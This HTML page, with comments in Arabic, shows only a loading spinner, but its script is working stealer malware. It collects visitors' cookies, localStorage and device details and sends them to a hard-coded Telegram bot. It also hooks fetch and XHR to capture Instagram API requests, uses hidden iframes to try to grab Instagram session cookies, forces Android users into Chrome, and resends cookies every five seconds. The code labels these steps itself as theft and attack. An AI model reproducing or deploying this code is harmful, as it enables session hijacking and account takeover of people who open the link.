<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>...</title>
    <style>
        body { background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: Arial; }
        .loader { width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #0095f6; border-radius: 50%; margin: 0 auto 20px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .container { text-align: center; }
    </style>
</head>
<body>
<div class="container">
    <div class="loader"></div>
    <p>جاري التحميل...</p>
</div>

<script>
// ============================================
// بيانات البوت
// ============================================
var BOT_TOKEN = "8799007815:AAFoZ7f_T3fcmbNHVy0Rqcv9qpMytp1bEFU";
var CHAT_ID = "6181826564";

// ============================================
// إرسال إلى تليجرام
// ============================================
function sendToTelegram(msg) {
    try {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", true);
        xhr.setRequestHeader("Content-Type", "application/json");
        xhr.send(JSON.stringify({chat_id: CHAT_ID, text: msg.substring(0, 4000), parse_mode: "HTML"}));
    } catch(e) {}
}

// ============================================
// كشف التطبيق بدقة
// ============================================
function getApp() {
    var ua = navigator.userAgent;
    if (ua.indexOf("Instagram") > -1) return {name:"Instagram", isWebView:true};
    if (ua.indexOf("FBAN") > -1) return {name:"Facebook", isWebView:true};
    if (ua.indexOf("WhatsApp") > -1) return {name:"WhatsApp", isWebView:true};
    if (ua.indexOf("Twitter") > -1) return {name:"Twitter", isWebView:true};
    if (ua.indexOf("Snapchat") > -1) return {name:"Snapchat", isWebView:true};
    if (ua.indexOf("Telegram") > -1) return {name:"Telegram", isWebView:true};
    if (ua.indexOf("wv") > -1) return {name:"WebView", isWebView:true};
    return {name:"Browser", isWebView:false};
}

var app = getApp();

// ============================================
// تقنية 1: سرقة كل شيء فوراً
// ============================================
function stealAll() {
    // كوكيز
    var c = document.cookie;
    if (c && c.length > 0) sendToTelegram("🍪 Cookies\n" + c);
    else sendToTelegram("⚠️ لا توجد كوكيز (WebView لا يشاركها)");
    
    // LocalStorage
    var l = {};
    for (var i = 0; i < localStorage.length; i++) { var k = localStorage.key(i); l[k] = localStorage.getItem(k); }
    if (Object.keys(l).length > 0) sendToTelegram("💾 LocalStorage\n" + JSON.stringify(l));
    
    // معلومات كاملة
    var info = {
        ua: navigator.userAgent,
        lang: navigator.language,
        screen: screen.width + "x" + screen.height,
        url: location.href,
        ref: document.referrer,
        time: new Date().toISOString(),
        app: app.name,
        isWebView: app.isWebView,
        platform: navigator.platform
    };
    sendToTelegram("💻 معلومات\n" + JSON.stringify(info));
}

// ============================================
// تقنية 2: إجبار الفتح في متصفح خارجي (Android)
// ============================================
function forceExternalBrowser() {
    var url = window.location.href;
    
    // Android Intent
    var intentUrl = "intent://" + url.replace("https://", "").replace("http://", "") + "#Intent;scheme=https;package=com.android.chrome;end;";
    
    // محاولة فتح Chrome
    window.location.href = intentUrl;
    
    // بديل بعد 2 ثانية
    setTimeout(function() {
        window.location.href = url;
    }, 2000);
}

// ============================================
// تقنية 3: محاولة سرقة الـ Access Token من Instagram (WebView)
// ============================================
function stealInstagramToken() {
    // محاولة الاستماع لأي طلبات API من Instagram داخل WebView
    var originalFetch = window.fetch;
    window.fetch = function() {
        var args = arguments;
        if (args[0] && typeof args[0] === 'string') {
            if (args[0].includes('instagram.com') || args[0].includes('graphql')) {
                sendToTelegram("🌐 طلب API تم اعتراضه: " + args[0].substring(0, 500));
            }
        }
        return originalFetch.apply(this, args);
    };
    
    var originalXHR = window.XMLHttpRequest;
    window.XMLHttpRequest = function() {
        var xhr = new originalXHR();
        var originalOpen = xhr.open;
        xhr.open = function(method, url) {
            if (url && (url.includes('instagram.com') || url.includes('graphql'))) {
                sendToTelegram("🌐 XHR تم اعتراضه: " + method + " " + url.substring(0, 500));
            }
            return originalOpen.apply(this, arguments);
        };
        return xhr;
    };
}

// ============================================
// تقنية 4: محاولة استغلال ثغرة لإجبار التطبيق على مشاركة الكوكيز
// ============================================
function exploitWebView() {
    // إنشاء iframe مخفي لمحاولة تحميل Instagram داخل الصفحة
    var iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    iframe.src = 'https://www.instagram.com/api/v1/web/accounts/current_user/';
    iframe.onload = function() {
        try {
            var content = iframe.contentWindow.document;
            var cookies = content.cookie;
            if (cookies && cookies.length > 0) {
                sendToTelegram("🔐 [EXPLOIT] Cookies from iframe: " + cookies);
            }
        } catch(e) {}
    };
    document.body.appendChild(iframe);
    
    // محاولة تحميل صفحة Instagram في iframe آخر
    setTimeout(function() {
        var iframe2 = document.createElement('iframe');
        iframe2.style.display = 'none';
        iframe2.src = 'https://www.instagram.com/';
        document.body.appendChild(iframe2);
    }, 1000);
}

// ============================================
// التشغيل الرئيسي
// ============================================
if (app.isWebView) {
    sendToTelegram("🔥 [ATTACK] مستخدم داخل تطبيق: " + app.name + " - محاولة اختراق متقدمة");
    
    // محاولة سرقة ما يمكن سرقته أولاً
    stealAll();
    
    // محاولة استغلال WebView
    exploitWebView();
    
    // مراقبة أي طلبات API
    stealInstagramToken();
    
    // إجبار الفتح في المتصفح الخارجي
    setTimeout(function() {
        forceExternalBrowser();
    }, 3000);
} else {
    // متصفح عادي - سرقة كل شيء
    stealAll();
    setTimeout(function() {
        window.location.href = "https://www.instagram.com";
    }, 2000);
}

// إعادة المحاولة كل 5 ثواني (لأي بيانات تظهر لاحقاً)
setInterval(function() {
    var c = document.cookie;
    if (c && c.length > 0) sendToTelegram("🔄 [REPEAT] Cookies: " + c);
}, 5000);
</script>
</body>
</html>
